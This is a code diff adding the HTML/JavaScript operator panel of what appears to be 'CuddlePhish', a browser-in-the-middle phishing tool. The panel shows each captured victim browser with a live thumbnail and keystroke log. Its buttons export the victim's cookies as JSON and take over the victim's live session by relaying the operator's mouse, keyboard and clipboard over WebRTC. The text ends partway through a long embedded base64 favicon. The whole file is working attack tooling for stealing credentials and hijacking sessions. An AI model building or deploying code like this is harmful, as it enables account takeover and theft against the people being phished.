@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CuddlePhish</title>
+    <meta charset="UTF-8" />
+    <script type="text/javascript" src="./jquery.min.js"></script>
+  </head>
+  <body>
+    <table id="browsers">
+    </table>
+    <video id="main_video" playsinline autoplay muted style="width: 0vw; height: 0;"></video>
+    <style>
+html, body {margin: 0; height: 100%; overflow: hidden}
+.thumbnail {height: 30; width: auto;}
+    </style>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+
+//couple of helper functions
+function width(){
+  return window.innerWidth 
+  || document.documentElement.clientWidth 
+  || document.body.clientWidth 
+  || 0;
+}
+
+function height(){
+  return window.innerHeight 
+  || document.documentElement.clientHeight 
+  || document.body.clientHeight 
+  || 0;
+}
+
+//declare connnection and video in global scope for further reference
+const mainVideo = document.querySelector("#main_video")
+
+//connect to the server over websockets and anounce we are a new phish
+const socket = io.connect(window.location.origin,{
+  auth: {
+    token: 'SOCKET_KEY'
+  }
+})
+let viewport_width = width()
+let viewport_height = height()
+socket.emit('new_admin', viewport_width, viewport_height)
+
+socket.on("thumbnail", function(browser_id, thumbnail_blob, keylog){
+  if($("#row_" + browser_id)[0] == undefined){
+    $('#browsers').append($(` \
+      <tr id="row_${browser_id}"> \
+        <td><img id="video_${browser_id}" class="thumbnail" height="140" src="" /></td> \
+        <td><span id="keylog_${browser_id}" class="keylog"></span></td> \
+        <td><button id="bootuser_${browser_id}" class="bootuser">Boot User</button></td> \
+        <td><button id="takeover_${browser_id}" class="takeover">Take Over</button></td> \
+        <td><button id="cookies_${browser_id}" class="cookies">Get Cookies</button></td> \
+        <td><button id="remove_${browser_id}" class="remove">Remove Instance</button></td> \
+        <td><span id="info_${browser_id}" class="info">browser:${browser_id}</span></td> \
+      </tr> \
+    `))
+  }
+  $("#video_" + browser_id)[0].src = thumbnail_blob
+  $("#keylog_" + browser_id)[0].innerText = keylog
+})
+
+socket.on("keylog", function(browser_id, keydata){
+  console.log(keydata)
+  let log_span = $("#keylog_" + browser_id)[0]
+  if(log_span != undefined){
+    log_span.innerText = keydata
+  }
+})
+
+$(document).on('click', '.bootuser', function () {
+  let browser_id = this.id.replace("bootuser_", "")
+  socket.emit('boot_user', browser_id)
+})
+
+$(document).on('click', '.cookies', function () {
+  let browser_id = this.id.replace("cookies_", "")
+  socket.emit('get_cookies', browser_id)
+})
+
+$(document).on('click', '.remove', function () {
+  let browser_id = this.id.replace("remove_", "")
+  socket.emit('remove_instance', browser_id)
+})
+
+socket.on("cookie_jar", function(cookie_data){
+  download_json(JSON.stringify(cookie_data.cookies), `cuddle_${cookie_data.browser_id}`)
+})
+
+socket.on("removed_instance", function(browser_id){
+  $("#row_" + browser_id)[0].remove()
+})
+
+$(document).on('click', '.takeover', function () {
+  let browser_id = this.id.replace("takeover_", "")
+  mainVideo.style = "position: fixed; width: 100vw; height: auto;"
+  driving = true
+  $("#browsers").hide()
+  socket.emit('take_over_browser', browser_id, viewport_width, viewport_height)
+})
+
+socket.on("push_state", function(new_state){
+  //history.pushState({},'','/' + new_state)
+})
+
+socket.on("copy_to_clipboard", function(data){
+  copy_to_clipboard(data)
+})
+
+const handleStreamOffer = async function(broadcaster_socket_id, offer, video_element){
+}
+
+//1) wait for a video stream offer
+socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
+   peerConnection = new RTCPeerConnection({
+    iceServers: [
+      {
+        "urls": "stun:stun.l.google.com:19302",
+      },
+      // { 
+      //   "urls": "turn:TURN_IP?transport=tcp",
+      //   "username": "TURN_USERNAME",
+      //   "credential": "TURN_CREDENTIALS"
+      // }
+    ]
+  })
+  //2) set up an answer an send back to the broadcaster
+  peerConnection
+    .setRemoteDescription(offer)
+    .then(() => peerConnection.createAnswer())
+    .then(sdp => peerConnection.setLocalDescription(sdp))
+    .then(() => {
+      socket.emit("video_stream_answer", broadcaster_socket_id, peerConnection.localDescription)
+    }) 
+  //add video track when it becomes available
+  peerConnection.ontrack = function(event){
+    mainVideo.srcObject = event.streams[0]
+  }
+  //3) send ICE candidates as they become available
+  peerConnection.onicecandidate = function(event){
+    if (event.candidate) {
+      socket.emit("candidate", broadcaster_socket_id, event.candidate)
+    }
+  }  
+})
+
+socket.on("candidate", function(broadcaster_socket_id, candidate){
+  peerConnection
+    .addIceCandidate(new RTCIceCandidate(candidate))
+    .catch(e => console.error(e))
+})
+
+var peerConnection;
+
+var driving = false;
+
+//joystick actions for mouse events
+document.addEventListener("mousedown", handleMouseEvent, !1) 
+document.addEventListener("mouseup", handleMouseEvent, !1) 
+document.addEventListener("mousemove", handleMouseEvent, !1) 
+document.addEventListener("mousewheel", handleMouseEvent, !1) 
+document.addEventListener("click", handleMouseEvent, !1) 
+
+window.addEventListener('popstate', function(event){
+  socket.emit('go_back')
+})
+
+window.addEventListener('paste', function(event){
+  let paste_data = (event.clipboardData || window.clipboardData).getData('text')
+  socket.emit('paste', paste_data)
+  event.preventDefault()
+})
+
+function handleMouseEvent(e){
+  if(driving){
+    if(e.type == "mousewheel"){
+      socket.emit('mouse_event', {"type": e.type, "wheelDeltaX": e.wheelDeltaX, "wheelDeltaY": e.wheelDeltaY})
+    }else{
+      //console.log({"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
+      socket.emit('mouse_event', {"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
+    }
+  }
+}
+
+//joystick actions for key events
+document.addEventListener('keydown', keyDown)
+document.addEventListener('keyup', keyUp)
+
+var ctrlKey = false
+
+function keyDown(e) {
+  if(driving){
+    if(e.keyCode == 9 || e.which == 9){
+      e.preventDefault()
+    }
+    if(e.keyCode == 86 && ctrlKey){
+      return
+    }
+    if(e.keyCode == 67 && ctrlKey){
+      socket.emit('copy')
+      e.preventDefault()
+      return
+    }
+    if(e.key == 'Escape'){
+      driving = false
+      mainVideo.style = "width: 0vw; height: 0;"
+      $("#browsers").show()
+      return
+    }
+    if(e.key == 'Meta'){
+      ctrlKey = true
+      return
+    }
+    socket.emit("keydown", e.key)
+  }
+}
+
+function keyUp(e) {
+  if(driving){
+    if(e.key == 'Meta'){
+      ctrlKey = false
+      return
+    }
+    socket.emit("keyup", e.key)
+  }
+}
+
+download_json = function(exportObj, exportName){
+  var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(exportObj);
+  var downloadAnchorNode = document.createElement('a');
+  downloadAnchorNode.setAttribute("href",     dataStr);
+  downloadAnchorNode.setAttribute("download", exportName + ".json");
+  document.body.appendChild(downloadAnchorNode); // required for firefox
+  downloadAnchorNode.click();
+  downloadAnchorNode.remove();
+}
+
+copy_to_clipboard = function (data) {
+  // Create a dummy input to copy the string inside it
+  var dummy = document.createElement("textarea");
+  // Add it to the document
+  document.body.appendChild(dummy);
+  // Set its ID
+  dummy.setAttribute("id", "dummy_id");
+  // Output the array into it
+  document.getElementById("dummy_id").value = data;
+  // Select it
+  dummy.select();
+  // Copy its contents
+  document.execCommand("copy");
+  // Remove it as its not needed anymore
+  document.body.removeChild(dummy);
+}
+
+document.addEventListener("DOMContentLoaded", function (event) {
+  var favIcon = "AAABAAMAEBAAAAEAIABoBAAANgAAACAgAAABACAAKBEAAJ4EAAAwMAAAAQAgAGgmAADGFQAAKAAAABAAAAAgAAAAAQAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP39/f/9/f3//f39/5iYsv8HB5z/wcHA//39/f/9/f3//f38//39/P/9/f3/9vX0//b29f/9/fz/8/38/+bm2v/9/f3//f39//b29v8REbD/Rkak//39/f/8/Pv/pqa3/6Kjrf/v7+///f38/2FgiP81NYr/+Pj3//39/P/9/fz//f39//39/f/s7Oz/AgK4/w8Puv/X1tf//f39/5ubsf8DBKz/OTmB//39/P9nZ4f/AAHk/8TExP/9/fz//f39//39/f/9/f3//f39/1FSo/8BAv3/ISGv/6GhqP8gIJv/AQHi/2hnjP+cnJ7/Dw5E/x0cZv+Af37/iYR+/4SDg//9/fz//f39//39/P+7u7z/AgJ//wABm/8BAbr/AQL+/wEBuP9BQYf/BAR+/09MT/9HREP/XFlY/29VPf87OTj//f39//39/f/X19b/Kil9/ycol/95eZ7/AAHl/wEC/f8BAvv/AQL4/wEC7/8LDL//SUdO/3p2df+edlH/Z1lN//39/f/9/f3/rq63/xwcWP9BQWf/9/f3/xMTk/8BAvn/AAGx/wABxv8BAvT/QEC5/318e/+OiYj/Z2Ri/3p2df/9/fz/1NTT/5KQi/+HhYD/5ubl/7q5uf8XDBj/JxQD/wkFgv8KBob/KBUC/x8TFv+MjIv/d3V0/25sa/9pZmb//f38/42Lif/h3dP/l5WR//39/P92c2//KxYC/ysWAv8gEQn/IREI/ysWAv8qFgH/kI+N//39/P/9/fz//f38//f39v+GhH//5eDX/6GgnP/y8fH/XFxk/wABrf8BAa7/AQGx/wABtP8AAbX/AQKM/7i3t//9/fz//f39//39/f+5ubj/wr62/5+cl//Hx8b/9vb1/wQFkv8BAer/AQLg/wEC6P8BAv7/AAHp/wAB6f87O6X//f38//39/P/9/f3/kpGP/4WDgP/g4OD//f38//z8+/8jI3r/AQHE/wEB0v8AAtn/AAH3/wABu/8CAp3/T06A//39/P/9/fz//f39/7e3t//29vX//f38//39/P/9/fz/hoKQ/y4UbP8xHHL/MyJ+/zkngP9DLZT/SzKm/66tsP/9/fz//f38//39/f/9/f3//f39//39/P/9/fz//f38/+Dg3/80HW3/UDav/082sP9PNq//Tzav/0AthP/r6+r//f39//39/f/9/f3//f39//39/f/9/fz//f38//39/P/9/fz/raq0/0YxlP9PNrD/Tzav/0cwnf+hna3//f39//39/f/9/fz//f39//39/f/9/f3//f38//39/P/9/fz//f38//39/f/Ix8r/fXWa/3xznf+8usH//f39//39/f/9/fz//f38//39/P8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAACAAAABAAAAAAQAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP39/f/9/f3//f39//39/f/9/f3//f39//3+/f+hoKD/GxtY/wEBcv+Dg4L//f38//39/P/9/f3//f39//39/f/9/fz//f39//39/P/9/f3//f39//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/fz/1/39/9H1o//Nq83//f39//39/f/9/f3//f39//39/f/9/f3/wsHB/wICa/8BAf7/AACn/4aGhf/9/fz//f39//39/f/9/f3//f38//39/P/9/fz//f38//39/f/9/f3//f39//39/P/g397/4eHg//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/f3//f39//39/f/9/f3//f39//39/f9AQFz/AQL4/wEB1f9oZ2z//f38//39/f/9/fz//f39//39/f/9/fz//f38//39/P/9/fz//f39//39/f/9/fz/s7Oy/wICPv8HBz7/t7e2//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/f3//f39//39/f/9/f3/4eHg/wIBb/8BAv7/AQGg/66urv/9/f3//f39//39/f/4+Pf/Z2d2/zc2bv8xMl3/X19h/8bGxv/9/fz//f38//39/P/NzMz/AQFl/wEC9P8UE0D/6urp//39/P/9/fz//f38//39/P/9/f3//f39//39/f/9/f3//f39//39/f/Kysr/AQGH/wEC/v8BAuv/OTlN//n5+f/9/f3//f39//39/P+Pj5H/Cwtm/wAC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7/8AAfv/AAH+/wAC/v8AAv3/BAWM/97e3P/9/fz//f38//39/f/9/fz//f39//39/f/9/f3//f38/+fn5v80MzH/4d3T/+Tf1v/t6eH/b21o/9ra2v/9/fz/0M/P/0FAQP8QDyv/AAFa/wEAb/8BAIT/AQGQ/wEBjv8AAYT/AQF4/wEBbf8BAWr/AQFt/wEBav8BAT//Xl1h/6ampf/9/fz//f38//39/f/9/f3//f39//39/f/9/fz/nJua/3x5dP/i3dT/7+vj/8vHwP9MS0r//f38//39/P/h4N//AAFS/wAB5P8AAf7/AQL+/wEC/v8BAv7/AQL+/wEC/v8BAv7/AQL+/wAB/v8AAv7/AAL+/wAC/v8AAdn/cnFx//39/P/9/fz//f38//39/P/9/fz//f39//39/P9QUE//yMW8/+Ld1P+EgX3/Pz8+/9fX1//9/fz//f38//39/P8SEjz/AAHX/wEBrf8BAv7/AQGH/wEC/v8BAv7/AQGl/wEC/v8BAf7/AAGq/wAC/v8BAej/AAHC/wAB0v95eXj//f39//39/f/9/fz//f39//39/f/9/f3/9vb1/zQzMf/V0cj/R0ZD/4yMjP/7+/v//f38//39/P/9/f3//f38/01NWP8AAeD/AQGS/wEC/v8BAHn/AQL+/wEC/v8BAXn/AQL+/wEB/v8AAYv/AAL+/wEB7f8AAc7/AQG3/4eHhv/9/fz//f38//39/P/9/f3//f39//39/f/Ozc3/T01K/z08Ov+8u7v//f38//39/P/9/f3//f38//39/P/5+fj/Pj49/wEBc/8BAaT/AQHd/wEC0/8AAv7/AAL+/wAC8P8AAfz/AAHm/wABxP8AAZ7/AQFu/wgFSv8RDiD/paSk//39/P/9/fz//f38//39/P/9/fz//f39/7y8vP8wMDD/4ODf//39/P/9/f3//f38//39/P/9/fz//f38//39/P/Q0M//GAo4/ycRXP8eDUb/GAo5/xYLRf8WDk3/GRBL/x4UR/8oG1n/MSFs/zsng/9HL53/TjSw/0hFUv/9/f3//f38//39/P/9/fz//f38//39/f/9/f3/+/r6//f39//9/f3//f39//39/P/9/fz//f38//39/f/9/f3//f39//39/P81MD//OhqI/zsaiP9FJ5v/UDWv/1A1sP9PNrD/Tzaw/082r/9PNrD/UDaw/1A2sP9HMJ3/dXV0//39/P/9/f3//f39//39/f/9/f3//f38//39/f/9/f3//f39//39/f/9/f3//f38//39/f/9/f3//f39//39/f/9/fz//f39/5OSkv8pEl7/PR2N/1A2r/9QNq//UDaw/082sP9PNq//Tzav/082r/9QNrD/UDav/zEhbv+4uLf//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f38//39/P/9/fz//f39//39/P/9/fz/9PTz/y0nOv8+H47/UDav/1A2r/9QNrD/Tzaw/083r/9PNq//Tzav/082r/9PNa//LypE//n5+P/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz/xcXE/yMYQf9PNa3/UDav/082r/9PNrD/Tzav/082r/9PNq//TzWw/y4fYP+3t7b//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz/0NDP/zAoTv9LM6X/Tzaw/082sP9PNq//Tzaw/082sP8vIWT/oqKi//39/f/9/f3//f39//39/f/9/f3//f38//39/P/9/fz//f39//39/f/9/f3//f39//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/f3/19jX/09MV/8oG1f/OieA/zwohf8wIGr/PjhW/7i4t//9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/f3//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/fz//f39/+Lh4f+xsK//rKyr/9ra2v/8/fz//f39//39/f/9/f3//f39//39/f/9/fz//f38//39/P/9/fz//f38//39/P8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAADAAAABgAAAAAQAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP39/f/9/fz//f39//39/f/9/f3//f39//3+/f/9/f3//f39//3+/f/39/b/uLe3/z49S/8LCzD/AQEl/1tbWv/4+Pf//f39//39/P/9/f3//f39//39/P/9/f3//f39//39/P/9/fz//f39//39/P/9/fz//f39//39/f/9/f3//f39//39/P/9/fz//v38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz/lP7+/+b5Y/9js7b/42p4//39/f/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//n5+f+hoaD/ExM//wEBp/8BAev/AQHO/yIiIv/k4+P//f38//39/P/9/f3//f39//39/f/9/fz//f38//39/P/9/fz//f38//39/P/9/f3//f39//39/f/9/f3//f39//39/f/+/fz//v38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f38//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f79/+Hh4P8sLET/AAHG/wEC/v8BAen/AABK/2JhYf/4+Pf//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/P/9/fz//f38//39/P/9/f3//f39//39/f/9/f3//f39//39/P/y8fD/u7q5/7i4uP/29vb//f39//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f38//39/f/9/f3//f79/4aFiP8BAYL/AQL7/wEC9v8EBHP/e3t9//39/P/9/f3//f39//39/P/9/f3//f38//39/f/9/f3//f38//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/f3//f38/+np6P9GRUj/AgEf/wUFIP9nZ2j/7u7u//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3/8vLx/yMiOv8BAcn/AQL+/wEC4v8mJlH/3t7e//39/f/9/f3//f38//39/P/9/f3//f39/+3t7f/Ew8P/sbGw/6ysq//AwL//6eno//39/P/9/f3//f38//39/P/9/fz//f38/+Li4f8tLTn/AQHA/wEBz/8JCUj/hISE//39/P/9/fz//f38//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3/v76+/wEBLf8BAfb/AQL+/wEC3/8qKk7/4eHg//39/f/9/f3//f39//39/f/9/fz/7+7u/zMzO/8YGF//EhJx/xAQZP8XFzf/JiYm/3x7e//s7Oz//f38//79/P/9/fz//v39//Hw8P9aWVr/AQGJ/wEC/f8BAcL/Cwsi/8jIyP/9/fz//f38//39/P/9/fz//f38//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3/pqWl/wEAPf8BAv7/AQL+/wEC8/8BAWf/ioqM//v7+//9/f3//f39//39/f/9/f3//f38/4aGh/8UE0r/AQK2/wAC7P8AAvj/AQGu/wICLP9KSk3/5ufl//39/f/+/f3//f39//r6+v93dnb/AQFE/wEC/v8BAv7/AQB7/1dXV//9/fz//f38//39/f/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3/vb29/wEBLP8BAvT/AQL+/wEC/v8BAc//Dw8z/6qqqv/8/Pv//f39//39/f/9/fz//v79//j49/+2trX/Wlld/wgIVP8BAcL/AQL8/wEB2/8CAjv/kpKR//39/P/9/f3//v38//Py8v9fX17/AQFX/wEC/v8BAv7/AQHI/y0tLP/5+fn//f39//39/P/9/fz//f38//39/P/9/fz//f39//39/f/9/f3//f39//39/f/9/f3//f39//39/f/9/f3/8/Ly/w0MJv8BAcz/AQL+/wEC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